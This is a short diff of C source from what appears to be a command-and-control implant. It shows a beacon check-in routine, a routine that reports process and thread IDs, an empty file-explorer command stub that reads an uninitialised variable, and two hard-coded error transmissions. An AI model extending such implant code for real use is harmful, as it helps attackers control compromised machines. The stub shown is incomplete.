@@ -91,16 +91,36 @@ FUNC VOID CommandRun(
     if ( !bCheck )
         return;
 
-    PackageAddBool( BK_PACKAGE, bCheck );
-    PackageAddInt32( BK_PACKAGE, ProcessId );
-    PackageAddInt32( BK_PACKAGE, ThreadId );
+    PackageAddBool(  BK_PACKAGE, bCheck     );
+    PackageAddInt32( BK_PACKAGE, ProcessId  );
+    PackageAddInt32( BK_PACKAGE, ThreadId   );
     PackageTransmit( BK_PACKAGE, NULL, NULL );
+}
+
+FUNC VOID CommandExplorer(
+    _In_ PPARSER Parser
+) {
+    EXPLR Explorer;
+
+    switch ( Explorer )
+    {
+    case CD: {
+
+    }
+        break;
+    
+    default:
+        break;
+    }
 }
 
 FUNC VOID CommandCheckin(
     _In_ PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
+
+    PackageTransmitError( 0x3 );
+    PackageTransmitError( 0x00000115 );
 
     BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );
 
